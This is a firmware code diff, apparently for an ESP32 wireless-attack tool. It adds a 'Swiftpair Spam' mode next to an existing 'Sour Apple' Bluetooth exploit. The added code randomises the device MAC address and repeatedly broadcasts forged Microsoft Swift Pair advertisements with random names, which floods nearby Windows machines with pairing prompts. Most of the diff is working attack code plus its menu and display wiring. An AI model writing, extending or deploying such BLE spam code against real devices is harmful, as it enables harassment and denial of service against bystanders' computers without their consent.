@@ -17,6 +17,11 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32
       return 0;
 }
 
+extern "C" {
+  uint8_t esp_base_mac_addr[6];
+  esp_err_t esp_ble_gap_set_rand_addr(const uint8_t *rand_addr);
+}
+
 #ifdef HAS_BT
   //ESP32 Sour Apple by RapierXbox
   //Exploit by ECTO-1A
@@ -45,6 +50,37 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32
     esp_fill_random(&packet[i], 3);
 
     randomAdvertisementData.addData(std::string((char *)packet, 17));
+    return randomAdvertisementData;
+  }
+
+  NimBLEAdvertisementData getSwiftAdvertisementData() {
+    extern WiFiScan wifi_scan_obj;
+    NimBLEAdvertisementData randomAdvertisementData = NimBLEAdvertisementData();
+    const char* display_name = wifi_scan_obj.generateRandomName();
+    uint8_t display_name_len = strlen(display_name);
+
+    uint8_t size = 7 + display_name_len;
+    uint8_t* packet = (uint8_t*)malloc(size);
+    uint8_t i = 0;
+
+    packet[i++] = size - 1; // Size
+    packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
+    packet[i++] = 0x06; // Company ID (Microsoft)
+    packet[i++] = 0x00; // ...
+    packet[i++] = 0x03; // Microsoft Beacon ID
+    packet[i++] = 0x00; // Microsoft Beacon Sub Scenario
+    packet[i++] = 0x80; // Reserved RSSI Byte
+    for (int j = 0; j < display_name_len; j++) {
+      packet[i + j] = display_name[j];
+    }
+    i += display_name_len;
+
+    randomAdvertisementData.addData(std::string((char *)packet, size));
+
+    free(packet);
+
+    free((void*)display_name);
+
     return randomAdvertisementData;
   }
 
@@ -447,6 +483,11 @@ void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color)
       RunSourApple(scan_mode, color);
     #endif
   }
+  else if (scan_mode == BT_ATTACK_SWIFTPAIR_SPAM) {
+    #ifdef HAS_BT
+      RunSwiftpairSpam(scan_mode, color);
+    #endif
+  }
   else if ((scan_mode == BT_SCAN_WAR_DRIVE) ||
            (scan_mode == BT_SCAN_WAR_DRIVE_CONT)) {
     #ifdef HAS_BT
@@ -611,6 +652,7 @@ void WiFiScan::StopScan(uint8_t scan_mode)
   
   else if ((currentScanMode == BT_SCAN_ALL) ||
   (currentScanMode == BT_ATTACK_SOUR_APPLE) ||
+  (currentScanMode == BT_ATTACK_SWIFTPAIR_SPAM) ||
   (currentScanMode == BT_SCAN_WAR_DRIVE) ||
   (currentScanMode == BT_SCAN_WAR_DRIVE_CONT) ||
   (currentScanMode == BT_SCAN_SKIMMERS))
@@ -1407,6 +1449,46 @@ void WiFiScan::executeSourApple() {
   #endif
 }
 
+const char* WiFiScan::generateRandomName() {
+  const char* charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+  int len = rand() % 10 + 1; // Generate a random length between 1 and 10
+  char* randomName = (char*)malloc((len + 1) * sizeof(char)); // Allocate memory for the random name
+  for (int i = 0; i < len; ++i) {
+    randomName[i] = charset[rand() % strlen(charset)]; // Select random characters from the charset
+  }
+  randomName[len] = '\0'; // Null-terminate the string
+  return randomName;
+}
+
+void WiFiScan::generateRandomMac(uint8_t* mac) {
+  for (int i = 0; i < 6; i++) {
+    mac[i] = random(0, 255);
+  }
+}
+
+void WiFiScan::executeSwiftpairSpam() {
+  #ifdef HAS_BT
+    uint8_t macAddr[6];
+    generateRandomMac(macAddr);
+
+    esp_base_mac_addr_set(macAddr);
+
+    NimBLEDevice::init("");
+
+    NimBLEServer *pServer = NimBLEDevice::createServer();
+
+    pAdvertising = pServer->getAdvertising();
+
+    NimBLEAdvertisementData advertisementData = getSwiftAdvertisementData();
+    pAdvertising->setAdvertisementData(advertisementData);
+    pAdvertising->start();
+    delay(10);
+    pAdvertising->stop();
+
+    NimBLEDevice::deinit();
+  #endif
+}
+
 void WiFiScan::executeWarDrive() {
   #ifdef HAS_GPS
     if (gps_obj.getGpsModuleStatus()) {
@@ -1773,6 +1855,26 @@ void WiFiScan::RunSourApple(uint8_t scan_mode, uint16_t color) {
       display_obj.tft.setTextColor(TFT_BLACK, color);
       display_obj.tft.fillRect(0,16,240,16, color);
       display_obj.tft.drawCentreString("Sour Apple",120,16,2);
+      display_obj.touchToExit();
+      display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
+    #endif
+
+    this->ble_initialized;
+  #endif
+}
+
+void WiFiScan::RunSwiftpairSpam(uint8_t scan_mode, uint16_t color) {
+  #ifdef HAS_BT
+    #ifdef HAS_SCREEN
+      display_obj.TOP_FIXED_AREA_2 = 48;
+      display_obj.tteBar = true;
+      display_obj.print_delay_1 = 15;
+      display_obj.print_delay_2 = 10;
+      display_obj.initScrollValues(true);
+      display_obj.tft.setTextWrap(false);
+      display_obj.tft.setTextColor(TFT_BLACK, color);
+      display_obj.tft.fillRect(0,16,240,16, color);
+      display_obj.tft.drawCentreString("Swiftpair Spam",120,16,2);
       display_obj.touchToExit();
       display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
     #endif
@@ -4123,6 +4225,25 @@ void WiFiScan::main(uint32_t currentTime)
       }
 
       this->executeSourApple();
+    #endif
+  }
+  else if (currentScanMode == BT_ATTACK_SWIFTPAIR_SPAM) {
+    #ifdef HAS_BT
+      if (currentTime - initTime >= 1000) {
+        initTime = millis();
+        String displayString = "";
+        String displayString2 = "";
+        displayString.concat("Advertising Data...");
+        for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
+          displayString2.concat(" ");
+        #ifdef HAS_SCREEN
+          display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
+          display_obj.showCenterText(displayString2, 160);
+          display_obj.showCenterText(displayString, 160);
+        #endif
+      }
+
+      this->executeSwiftpairSpam();
     #endif
   }
   else if (currentScanMode == WIFI_SCAN_WAR_DRIVE) {
